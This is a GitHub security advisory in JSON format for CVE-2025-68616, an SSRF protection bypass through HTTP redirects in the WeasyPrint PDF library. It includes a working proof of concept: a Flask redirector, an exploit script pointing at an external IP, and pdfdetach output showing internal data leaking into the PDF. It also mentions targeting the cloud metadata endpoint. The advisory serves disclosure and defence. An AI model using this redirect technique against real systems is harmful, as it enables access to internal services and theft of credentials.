{
  "id": "GHSA-983w-rhvv-gwmv",
  "modified": "2026-01-20T19:15:15.321413Z",
  "published": "2026-01-20T16:29:53Z",
  "aliases": [
    "CVE-2025-68616"
  ],
  "summary": "WeasyPrint has a Server-Side Request Forgery (SSRF) Protection Bypass via HTTP Redirect",
  "details": "### Summary\n\nA **Server-Side Request Forgery (SSRF) Protection Bypass** exists in WeasyPrint's `default_url_fetcher`. The vulnerability allows attackers to access internal network resources (such as `localhost` services or cloud metadata endpoints) even when a developer has implemented a custom `url_fetcher` to block such access. This occurs because the underlying `urllib` library follows HTTP redirects automatically without re-validating the new destination against the developer's security policy.\n\n### Details\n\nThe default URL fetching mechanism in WeasyPrint (default_url_fetcher in weasyprint/urls.py) is vulnerable to a Server-Side Request Forgery (SSRF) Protection Bypass.\n\nWhile WeasyPrint allows developers to define custom url_fetcher functions to validate or sanitize URLs before fetching (e.g., blocking internal IP addresses or specific ports), the underlying implementation uses Python's standard urllib.request.urlopen. By default, urllib automatically follows HTTP redirects (status codes 301, 302, 307, etc.) without returning control to the developer's validation logic for the new target URL.\n\nThis behavior creates a Time-of-Check to Time-of-Use (TOCTOU) vulnerability. An attacker can provide a URL that passes the developer's allowlist/blocklist (the Check) but immediately redirects to a blocked internal resource (the Use).\n\n### PoC\n\nTo reproduce this vulnerability, use the following setup. This scenario simulates a developer attempting to blacklist access to internal hostnames (e.g., `localhost`).\n\n**1. victim.py (Internal Service - Port 5000)**\nSimulates a sensitive internal service running on localhost.\n\n```python\nfrom flask import Flask\napp = Flask(__name__)\n\n@app.route('/secret')\ndef secret():\n    return \"CRITICAL_INTERNAL_DATA\"\n\nif __name__ == '__main__':\n    # Listens on localhost:5000\n    app.run(port=5000)\n```\n\n**2. attacker.py (External Redirector - Port 1337)**\nSimulates an external server. It accepts a request and redirects it to the blocked hostname (`localhost`).\n\n```python\nfrom flask import Flask, redirect\napp = Flask(__name__)\n\n@app.route('/image.png')\ndef malicious():\n    # The vulnerability: Redirects to the BLOCKED hostname\n    return redirect(\"http://localhost:5000/secret\", code=302)\n\nif __name__ == '__main__':\n    app.run(port=1337)\n```\n\n**3. exploit.py (Vulnerable Implementation)**\nSimulates the application with a security filter intended to block access to \"localhost\".\n\n```python\nfrom weasyprint import HTML, default_url_fetcher\nimport logging\n\n# Security Filter: Intended to block internal hostnames\ndef secure_fetcher(url):\n    # Simulates a blacklist for 'localhost'\n    if \"localhost\" in url:\n        raise PermissionError(f\"Security Block: Access to {url} denied.\")\n    \n    print(f\"[ALLOWED] Initial URL check passed for: {url}\")\n    return default_url_fetcher(url)\n\n# EXPLOIT LOGIC:\n# 1. We access the attacker via '127.0.0.1' (or an external IP). \n#    The string \"127.0.0.1\" passes the check because it is not \"localhost\".\n# 2. The attacker redirects to \"http://localhost:5000/...\".\n# 3. urllib follows the redirect to 'localhost' without re-triggering secure_fetcher.\n\ntry:\n    # Use 127.0.0.1 to bypass the string check for 'localhost'\n    html_content = '\u003clink rel=\"attachment\" href=\"http://54.234.88.160:1337/image.png\"\u003e'\n    \n    doc = HTML(string=html_content, url_fetcher=secure_fetcher)\n    doc.write_pdf(\"exploit.pdf\")\n    \n    print(\"Exploit successful. The 'localhost' block was bypassed via redirect.\")\n    print(\"Check exploit.pdf for 'CRITICAL_INTERNAL_DATA'.\")\nexcept Exception as e:\n    print(f\"Exploit failed: {e}\")\n```\n**4. Attacker read attachment in PDF**\n```\n➜ pdfdetach -list resultado_exploit.pdf\n1 embedded files\n1: secret\n➜ pdfdetach -saveall resultado_exploit.pdf\n➜ cat secret\nCRITICAL_INTERNAL_DATA\n```\n**Evidence**\n\u003cimg width=\"1514\" height=\"436\" alt=\"image\" src=\"https://github.com/user-attachments/assets/f7881694-be4d-4c63-8bca-2b220e4c87f9\" /\u003e\n\n### Impact\n\nThis vulnerability impacts any application or SaaS platform using WeasyPrint to render user-supplied HTML/CSS that attempts to restrict external resource loading.\n\n  * **Internal Network Reconnaissance:** Attackers can bypass firewalls or allowlists to scan and access internal services (e.g., Redis, ElasticSearch, Admin Panels) running on the loopback interface or local network.\n  * **Cloud Metadata Exfiltration:** In cloud environments, attackers can redirect requests to metadata services (e.g., `http://169.254.169.254`) to steal instance credentials and escalate privileges.\n  * **Security Control Bypass:** It renders the `url_fetcher` security validation logic ineffective against sophisticated attacks, creating a false sense of security for developers.",
  "affected": [
    {
      "package": {
        "ecosystem": "PyPI",
        "name": "weasyprint",
        "purl": "pkg:pypi/weasyprint"
      },
      "ranges": [
        {
          "type": "ECOSYSTEM",
          "events": [
            {
              "introduced": "0"
            },
            {
              "fixed": "68.0"
            }
          ]
        }
      ],
      "versions": [
        "0.1",
        "0.10",
        "0.11",
        "0.12",
        "0.13",
        "0.14",
        "0.15",
        "0.16",
        "0.17",
        "0.17.1",
        "0.18",
        "0.19",
        "0.19.1",
        "0.19.2",
        "0.2",
        "0.2.1",
        "0.2.2",
        "0.20",
        "0.20.1",
        "0.20.2",
        "0.21",
        "0.22",
        "0.23",
        "0.24",
        "0.25",
        "0.26",
        "0.27",
        "0.28",
        "0.29",
        "0.3",
        "0.3.1",
        "0.30",
        "0.31",
        "0.32",
        "0.33",
        "0.34",
        "0.35",
        "0.36",
        "0.37",
        "0.38",
        "0.39",
        "0.4",
        "0.40",
        "0.41",
        "0.42",
        "0.42.1",
        "0.42.2",
        "0.42.3",
        "0.5",
        "0.6",
        "0.6.1",
        "0.7",
        "0.7.1",
        "0.8",
        "0.9",
        "43",
        "43rc1",
        "43rc2",
        "44",
        "45",
        "46",
        "47",
        "48",
        "49",
        "50",
        "51",
        "52",
        "52.1",
        "52.2",
        "52.3",
        "52.4",
        "52.5",
        "53.0",
        "53.0b1",
        "53.0b2",
        "53.1",
        "53.2",
        "53.3",
        "53.4",
        "54.0",
        "54.0b1",
        "54.1",
        "54.2",
        "54.3",
        "55.0",
        "55.0b1",
        "56.0",
        "56.0b1",
        "56.1",
        "57.0",
        "57.0b1",
        "57.1",
        "57.2",
        "58.0",
        "58.0b1",
        "58.1",
        "59.0",
        "59.0b1",
        "60.0",
        "60.1",
        "60.2",
        "61.0",
        "61.1",
        "61.2",
        "62.0",
        "62.1",
        "62.2",
        "62.3",
        "63.0",
        "63.1",
        "64.0",
        "64.1",
        "65.0",
        "65.1",
        "66.0",
        "67.0"
      ],
      "database_specific": {
        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/01/GHSA-983w-rhvv-gwmv/GHSA-983w-rhvv-gwmv.json"
      }
    }
  ],
  "references": [
    {
      "type": "WEB",
      "url": "https://github.com/Kozea/WeasyPrint/security/advisories/GHSA-983w-rhvv-gwmv"
    },
    {
      "type": "ADVISORY",
      "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-68616"
    },
    {
      "type": "WEB",
      "url": "https://github.com/Kozea/WeasyPrint/commit/b6a14f0f3f4ce9c0c75c1a2d73cb1c5d43f0e565"
    },
    {
      "type": "PACKAGE",
      "url": "https://github.com/Kozea/WeasyPrint"
    }
  ]
}